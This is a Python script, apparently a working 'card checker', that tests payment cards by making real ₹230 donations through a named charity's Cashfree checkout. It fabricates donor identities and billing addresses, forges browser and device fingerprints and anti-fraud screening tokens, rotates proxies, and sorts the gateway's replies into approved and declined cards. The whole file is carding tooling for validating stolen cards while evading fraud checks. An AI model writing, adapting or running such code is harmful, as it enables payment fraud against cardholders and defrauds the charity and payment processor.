"""
Cashfree card checker — beyondonor.com donation flow (fixed ₹230 Mosquito Net).

Flow replayed from HAR:
  1. merchant checkout (Next.js server actions) -> paymentSessionId
  2. Cashfree session (redirect) + BIN eligibility + DCC (amount in USD)
  3. submit payment (card + billing address auto-derived from the BIN country)
  4. gateway view -> transactionToken + transactionData
  5. direct charge -> result (txnStatus + message)

Debit-family only (debit + prepaid + unknown are allowed through; credit is skipped).
Fresh identity + fresh session on every call (no reuse).
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import random
import re
import time
import urllib.parse
import uuid

from curl_cffi.requests import AsyncSession

# ── browser profile (only profiles curl_cffi actually supports) ──────
PROFILE_UA = {
    "chrome131": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "chrome136": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
}
BROWSER_PROFILES = list(PROFILE_UA.keys())

FIRST_NAMES = ['james', 'john', 'robert', 'michael', 'william', 'david', 'richard', 'joseph',
               'thomas', 'charles', 'daniel', 'matthew', 'anthony', 'mark', 'donald', 'steven',
               'paul', 'andrew', 'joshua', 'kenneth', 'kevin', 'brian', 'george', 'edward',
               'ronald', 'timothy', 'jason', 'jeffrey', 'ryan', 'jacob', 'mary', 'patricia',
               'jennifer', 'linda', 'elizabeth', 'barbara', 'susan', 'jessica', 'sarah', 'karen']
LAST_NAMES = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis',
              'rodriguez', 'martinez', 'anderson', 'taylor', 'thomas', 'moore', 'jackson',
              'martin', 'lee', 'white', 'harris', 'clark', 'lewis', 'robinson', 'walker',
              'young', 'allen', 'king', 'wright', 'scott', 'torres', 'nguyen', 'hill', 'flores']

COUNTRY_ADDRESSES = {
    "US": [("New York", "New York", "NY", "10080"), ("Los Angeles", "California", "CA", "90071"),
           ("Chicago", "Illinois", "IL", "60601"), ("Houston", "Texas", "TX", "77002")],
    "IN": [("Mumbai", "Maharashtra", "MH", "400001"), ("Delhi", "Delhi", "DL", "110001"),
           ("Bengaluru", "Karnataka", "KA", "560001"), ("Hyderabad", "Telangana", "TS", "500001")],
    "GB": [("London", "England", "ENG", "E1 6AN"), ("Manchester", "England", "ENG", "M1 1AE")],
    "CA": [("Toronto", "Ontario", "ON", "M5V 2T6"), ("Vancouver", "British Columbia", "BC", "V6B 1A1")],
    "AU": [("Sydney", "New South Wales", "NSW", "2000"), ("Melbourne", "Victoria", "VIC", "3000")],
}

CAMPAIGN_SLUG = "protect-tribal-families-from-mosquitoes-mosquito-net-campaign-2026-2"
CAMPAIGN_PAGE = f"https://www.beyondonor.com/campaigns/{CAMPAIGN_SLUG}"
MERCHANT_CHECKOUT = "https://www.beyondonor.com/checkout"
MERCHANT_JS_RE = re.compile(r"/_next/static/chunks/app/\(public\)/checkout/page-[a-z0-9]+\.js")
CF_SESSION_URL = "https://api.cashfree.com/pg/view/sessions/checkout"
CF_BASE = "https://api.cashfree.com"
CF_PAYMENTS_URL = CF_BASE + "/checkout/api/checkouts/payments"
CF_TDR_URL = CF_BASE + "/checkout/api/checkouts/payments/tdr"
CF_ELIG_URL = CF_BASE + "/checkout/api/checkouts/eligibility/payment_method/filter"
CF_DIRECT_CHARGE = "https://payments.cashfree.com/pgbillpayuiapi/card/direct-charge"


def parse_card(cc: str):
    parts = str(cc).strip().split("|")
    if len(parts) != 4:
        raise Exception("invalid card format")
    number, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    if len(year) == 2:
        year = "20" + year
    return number, month, year, cvv


def generate_identity():
    first = random.choice(FIRST_NAMES).capitalize()
    last = random.choice(LAST_NAMES).capitalize()
    phone = "9" + "".join(random.choice("0123456789") for _ in range(9))
    email = f"donor-{uuid.uuid4()}@beyondonor.com"
    return first, last, phone, email


def _device_id():
    return hashlib.md5(uuid.uuid4().hex.encode()).hexdigest()


def _device_data(device_id, ua, browser_name, browser_version, os_name, os_version, platform):
    return base64.b64encode(json.dumps({
        "architecture": 255,
        "audio_fingerprint": round(random.uniform(30, 40), 10),
        "battery_percentage": "NA",
        "browser_anti_finger_printing_extension": "NA",
        "browser_hash": hashlib.sha256(ua.encode()).hexdigest(),
        "browser_name": browser_name,
        "browser_version": browser_version,
        "canvas_device_fingerprint": "ignored",
        "cookie_enabled": True,
        "cookie_hash": hashlib.sha256(str(random.random()).encode()).hexdigest(),
        "device_hash": device_id,
        "device_type": "Desktop",
        "flash_or_java_detected": False,
        "high_activity": True,
        "installed_bots": False,
        "installed_plugins": "PDF Viewer, Chrome PDF Viewer, Chromium PDF Viewer, WebKit built-in PDF",
        "internet_type": "NA",
        "is_dev_tool_open": False,
        "os_name": os_name,
        "os_version": os_version,
        "platform": platform,
        "screen_resolution": "1920x1080",
        "session_fingerprint": hashlib.sha256(uuid.uuid4().hex.encode()).hexdigest(),
        "timezone": "Asia/Kolkata",
        "timezone_offset": -330,
        "touch_support": 0,
        "user_agent": ua,
    }).encode()).decode()


def _forter_token():
    return (f"{uuid.uuid4().hex[:24]}_{int(time.time()*1000)}__"
            f"{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_', k=11))}__"
            f"{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_', k=11))}")


def _address_for_country(country_code):
    pool = COUNTRY_ADDRESSES.get(country_code) or COUNTRY_ADDRESSES["US"]
    city, state, state_code, zipcode = random.choice(pool)
    return {
        "city": city, "state": state, "state_code": state_code, "zip_code": zipcode,
        "address_line_one": city.lower(), "country": country_code,
    }


CASHFREE_RESULT_MAP = {
    "SUCCESS": "ORDER_PAID",
    "insufficient funds": "INSUFFICIENT_FUNDS",
    "declined": "CARD_DECLINED",
    "expired": "EXPIRE_CARD",
    "cvv": "INCORRECT_CVC",
    "invalid card": "INVALID_PAYMENT_METHOD",
    "do not honor": "DO_NOT_HONOR",
    "stolen": "STOLEN_CARD",
    "lost": "LOST_CARD",
    "fraud": "FRAUD_SUSPECTED",
    "blocked": "RESTRICTED_CARD",
    "limit": "LIMIT_EXCEEDED",
    "3ds": "3DS_REQUIRED",
    "authentication": "3DS_REQUIRED",
    "not supported": "NOT_SUPPORTED",
    "invalid expiry": "EXPIRE_CARD",
    "invalid month": "EXPIRE_CARD",
    "invalid year": "EXPIRE_CARD",
    "invalid cvv": "INCORRECT_CVC",
    "invalid pin": "INCORRECT_CVC",
    "amount mismatch": "AMOUNT_MISMATCH",
}


def map_result(txn_status: str, message: str):
    if txn_status == "SUCCESS":
        return "ORDER_PAID", "CHARGED"
    if txn_status in ("PENDING", "PENDING_ACTION", "IN_PROGRESS"):
        return "PROCESSING", "PENDING"
    low = (message or "").lower()
    for key, code in CASHFREE_RESULT_MAP.items():
        if key in low:
            return code, ("APPROVED" if code in (
                "INSUFFICIENT_FUNDS", "3DS_REQUIRED", "INCORRECT_CVC", "EXPIRE_CARD"
            ) else "DECLINED")
    return "GENERIC_DECLINE", "DECLINED"


class CashfreeResult:
    def __init__(self, cc, response_code, response, real_response, amount, currency="INR"):
        self.cc = cc
        self.response_code = response_code
        self.response = response
        self.real_response = real_response
        self.amount = amount
        self.currency = currency
        self.gateway = "Cashfree"


def _new_session(impersonate: str, proxy_url: str, headers: dict) -> AsyncSession:
    """Create AsyncSession with impersonate fallback (curl_cffi-safe)."""
    def _mk(imp):
        sess = AsyncSession(impersonate=imp, timeout=30)
        sess.headers.update(headers)
        if proxy_url:
            sess.proxies = {"http": proxy_url, "https": proxy_url}
        return sess
    try:
        return _mk(impersonate)
    except Exception:
        return _mk("chrome131")


async def run_cashfree_check(card_entry: str, proxy_url: str = "") -> CashfreeResult:
    number, month, year, cvv = parse_card(card_entry)
    first, last, phone, email = generate_identity()
    full_name = f"{first} {last}"

    impersonate = random.choice(BROWSER_PROFILES)
    ua = PROFILE_UA[impersonate]
    browser_name = "MozillaFirefox" if "Firefox" in ua else "GoogleChrome"
    browser_version_m = re.search(r"(?:Firefox|Chrome)/([\d.]+)", ua)
    browser_version = browser_version_m.group(1) if browser_version_m else "131.0"
    os_name = "Linux" if "Linux" in ua else ("Windows" if "Windows" in ua else "macOS")
    os_version = "Ubuntu" if "Ubuntu" in ua else "10"
    platform = "Linux x86_64" if "Linux" in ua else ("Win32" if "Windows" in ua else "MacIntel")
    device_id = _device_id()

    base_headers = {
        "User-Agent": ua,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
    }

    s = _new_session(impersonate, proxy_url, base_headers)

    try:
        # ═══ 1. merchant checkout page + server action ids (with retry) ═══
        checkout_html = ""
        m = None
        for attempt in range(3):
            try:
                r = await s.get(MERCHANT_CHECKOUT, headers={
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                })
                checkout_html = r.text
                m = MERCHANT_JS_RE.search(checkout_html)
                if m:
                    break
            except Exception:
                pass
            await asyncio.sleep(1.5)
        if not m:
            raise Exception("could not find checkout page JS chunk (3 tries)")

        js_url = "https://www.beyondonor.com" + m.group(0)
        js = ""
        m_fetch = m_checkout = None
        for attempt in range(3):
            try:
                r = await s.get(js_url)
                js = r.text
                m_fetch = re.search(
                    r'createServerReference\)\("([a-z0-9]+)",[^,]+,[^,]+,[^,]+,"fetchCampaignMetaAction"\)', js)
                m_checkout = re.search(
                    r'createServerReference\)\("([a-z0-9]+)",[^,]+,[^,]+,[^,]+,"checkoutAction"\)', js)
                if m_fetch and m_checkout:
                    break
            except Exception:
                pass
            await asyncio.sleep(1.0)
        if not m_fetch or not m_checkout:
            raise Exception("could not find server action ids in checkout JS (3 tries)")
        checkout_action = m_checkout.group(1)

        # ═══ 2. campaign meta ═══
        campaign_id = ""
        campaign_title = ""
        campaign_slug = CAMPAIGN_SLUG
        campaign_item_id = ""
        item_name = ""
        unit_price = 230
        r = await s.get(CAMPAIGN_PAGE, headers={"Accept": "text/x-component", "RSC": "1"})
        page = r.text
        m = re.search(r'"campaignId":"([^"]+)"', page)
        if m:
            campaign_id = m.group(1)
        m = re.search(r'"campaignItemId":"([^"]+)"', page)
        if m:
            campaign_item_id = m.group(1)
        m = re.search(r'"itemName":"([^"]+)"', page)
        if m:
            item_name = m.group(1)
        m = re.search(r'"campaignTitle":"([^"]+)"', page)
        if m:
            campaign_title = m.group(1)
        m = re.search(r'"unitPrice":([0-9.]+)', page)
        if m:
            unit_price = float(m.group(1))
        if not campaign_id or not campaign_item_id:
            raise Exception("could not extract campaign info")

        # ═══ 3. merchant checkout (Next.js server action) -> paymentSessionId ═══
        occasion = {
            "eventDate": False, "promotionName": False, "promotionPhoto": False,
            "wishText": False, "videoWishText": False,
        }
        key = f"{campaign_id}-{campaign_item_id}-{int(time.time()*1000)}"
        order_body = json.dumps([{
            "donor": {"donorName": full_name, "donorPhone": phone,
                      "donorEmail": None, "donorAddress": None},
            "lines": [{
                "campaignId": campaign_id, "campaignTitle": campaign_title,
                "campaignSlug": campaign_slug, "campaignItemId": campaign_item_id,
                "itemName": item_name, "quantity": 1, "unitPrice": unit_price,
                "campaignType": "product", "occasionInputs": occasion, "key": key,
                "eventDate": None, "promotionName": None, "wishText": None,
                "videoWishText": None,
            }],
        }])
        router_tree = urllib.parse.quote(json.dumps([
            "", {"children": [
                "(public)", {"children": [
                    "checkout", {"children": ["__PAGE__", {}, None, None]}, None, None
                ]}, None, None
            ]}, None, None, True
        ]).replace("None", "null"))
        r = await s.post(MERCHANT_CHECKOUT, data=order_body,
                         headers={
                             "next-action": checkout_action,
                             "next-router-state-tree": router_tree,
                             "content-type": "text/plain;charset=UTF-8",
                             "origin": "https://www.beyondonor.com",
                             "referer": MERCHANT_CHECKOUT,
                             "accept": "text/x-component",
                         })
        if r.status_code != 200:
            raise Exception(f"merchant checkout failed: HTTP {r.status_code} body={r.text[:300]}")
        m = re.search(r'"paymentSessionId":"([^"]+)"', r.text)
        if not m:
            raise Exception("no paymentSessionId in merchant checkout response")
        payment_session_id = m.group(1)

        # ═══ 4. Cashfree session ═══
        browser_meta = base64.b64encode(json.dumps({"userAgent": ua}).encode()).decode()
        r = await s.post(CF_SESSION_URL, data={
            "payment_session_id": payment_session_id,
            "x_request_id": "x_request_id_form_atom",
            "form_id": "form_id_atom",
            "browser_meta": browser_meta,
            "platform": "jsxx-c-2026.10.05-x-d-m-156-l-Linux",
            "checkForPayFast": "false",
            "time_spent_on_page": str(random.randint(20000, 40000)),
        }, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.beyondonor.com",
            "Referer": "https://www.beyondonor.com/",
        })
        if r.status_code != 200:
            raise Exception(f"cashfree session failed: HTTP {r.status_code} body={r.text[:300]}")

        # ═══ 5. eligibility (BIN -> country / scheme / type) ═══
        device_data = _device_data(device_id, ua, browser_name, browser_version,
                                   os_name, os_version, platform)
        x_request_id = (f"CH-{time.strftime('%Y%m%d-%H%M%S')}-"
                        f"{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=6))}")
        elig_headers = {
            "Content-Type": "application/json", "Origin": CF_BASE,
            "Referer": f"{CF_BASE}/checkout/payment-method/card",
            "x-request-id": x_request_id, "x-chxs-id": payment_session_id,
            "x-device-id": device_id, "x-device-data": device_data,
            "x-client-device": "desktop", "x-client-rendering-type": "web",
        }
        elig = await s.post(CF_ELIG_URL, json={
            "payment_method_filter": {"card": {
                "cardIdentifierType": "PLAIN_CARD", "cardIdentifier": number,
            }}
        }, headers=elig_headers)

        # BIN rejected by Cashfree (RuPay, Amex, unsupported issuer) — NOT an error
        if elig.status_code == 400:
            try:
                err_body = elig.text[:300]
            except Exception:
                err_body = ""
            return CashfreeResult(
                card_entry, "CARD_NOT_SUPPORTED", "DECLINED",
                f"BIN_NOT_SUPPORTED: {err_body}", "230.00", "INR"
            )
        if elig.status_code != 200:
            raise Exception(f"eligibility failed: HTTP {elig.status_code} body={elig.text[:300]}")

        elig_data = elig.json()
        bin_resp = elig_data.get("cardBinResponse") or {}
        card_type = (bin_resp.get("type") or "").lower()
        card_scheme = (bin_resp.get("scheme") or "unknown")
        card_country = (bin_resp.get("countryCode") or "US").upper()

        if elig_data.get("errorMessagePresent") or (not card_type and not card_scheme):
            return CashfreeResult(
                card_entry, "CARD_NOT_SUPPORTED", "DECLINED",
                elig_data.get("errorMessage") or "CARD_NOT_SUPPORTED", "230.00", "INR"
            )

        # debit-family only (prepaid + unknown let through, credit skipped)
        if card_type and card_type not in ("debit", "prepaid", "unknown"):
            return CashfreeResult(
                card_entry, "CARD_TYPE_NOT_SUPPORTED", "DECLINED",
                f"{card_type.upper()}_SKIPPED", "230.00", "INR"
            )

        # ═══ 6. submit payment (with 502 retry, capture 400 body) ═══
        addr = _address_for_country(card_country)
        device_data = _device_data(device_id, ua, browser_name, browser_version,
                                   os_name, os_version, platform)
        forter = _forter_token()
        risk_data = base64.b64encode(json.dumps({
            "card_number_input_type": "user pasted"
        }).encode()).decode()
        x_request_id = (f"CH-{time.strftime('%Y%m%d-%H%M%S')}-"
                        f"{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=6))}")
        payment_body = {
            "payment_method": {"card": {
                "channel": "post", "card_number": number, "card_holder_name": full_name,
                "card_expiry_mm": month, "card_expiry_yy": year[-2:], "card_cvv": cvv,
                "dcc": True, "zip_code": addr["zip_code"], "country": addr["country"],
                "country_code": card_country, "address_line_one": addr["address_line_one"],
                "city": addr["city"], "state": addr["state"], "state_code": addr["state_code"],
            }},
            "save_instrument": False, "risk_data": risk_data, "reward_ids": [],
            "external_screening_token": forter + "__tt",
            "user_agent": ua,
        }
        cf_headers = {
            "Content-Type": "application/json", "Origin": CF_BASE,
            "Referer": f"{CF_BASE}/checkout/payment-method/card",
            "x-request-id": x_request_id, "x-chxs-id": payment_session_id,
            "x-device-id": device_id, "x-device-data": device_data,
            "x-client-device": "desktop", "x-client-rendering-type": "web",
            "cookie": f"forterToken={forter}",
        }

        pay_resp = None
        for attempt in range(3):
            pay_resp = await s.post(CF_PAYMENTS_URL, json=payment_body, headers=cf_headers)
            if pay_resp.status_code in (502, 503, 504):
                await asyncio.sleep(2 + attempt * 2)
                continue
            break

        if pay_resp is None or pay_resp.status_code != 200:
            body_txt = ""
            try:
                body_txt = pay_resp.text[:800] if pay_resp is not None else ""
            except Exception:
                pass
            sc = pay_resp.status_code if pay_resp is not None else 0
            raise Exception(f"payment submit failed: HTTP {sc} body={body_txt}")

        pay_data = pay_resp.json()
        gateway_url = (pay_data.get("data") or {}).get("url") or ""
        if not gateway_url:
            raise Exception(f"no gateway url in payment response: {json.dumps(pay_data)[:300]}")

        # ═══ 7. gateway view -> transactionToken + transactionData ═══
        r = await s.get(gateway_url, headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": f"{CF_BASE}/checkout/payment-method/card",
        })
        ghtml = r.text
        m_tok = re.search(r"""id=['"]txnToken['"]\s+value=['"]([^'"]+)['"]""", ghtml)
        m_id = re.search(r"""id=['"]txnID['"]\s+value=['"]([^'"]+)['"]""", ghtml)
        m_data = re.search(r"""id=['"]txnData['"]\s+value=['"]([^'"]{200,})['"]""", ghtml)
        if not m_data:
            m_data = re.search(r"""value=['"]([A-Za-z0-9+/=]{200,})['"]""", ghtml)
        if not m_tok or not m_id or not m_data:
            raise Exception(
                f"could not extract txn token/data from gateway view "
                f"(tok={bool(m_tok)} id={bool(m_id)} data={bool(m_data)} html_len={len(ghtml)})"
            )
        txn_token = m_tok.group(1)
        txn_id = m_id.group(1)
        txn_data = m_data.group(1)

        # ═══ 8. direct charge (fix: message can be str OR dict) ═══
        r = await s.post(CF_DIRECT_CHARGE, json={
            "transactionToken": txn_token,
            "transactionId": txn_id,
            "transactionData": txn_data,
        }, headers={
            "Content-Type": "application/json",
            "Origin": CF_BASE,
            "Referer": CF_BASE + "/",
        })
        if r.status_code != 200:
            raise Exception(f"direct charge failed: HTTP {r.status_code} body={r.text[:400]}")

        dc = r.json()
        msg_obj = dc.get("message")
        if isinstance(msg_obj, dict):
            msg = msg_obj.get("message") or ""
            txn_status = msg_obj.get("txnStatus") or ""
        else:
            msg = str(msg_obj or "")
            txn_status = ""

        code, label = map_result(txn_status, msg)
        real = f"{txn_status}: {msg}" if msg and txn_status else (txn_status or msg)
        return CashfreeResult(card_entry, code, label, real, "230.00", "INR")

    finally:
        try:
            await s.close()
        except Exception:
            pass
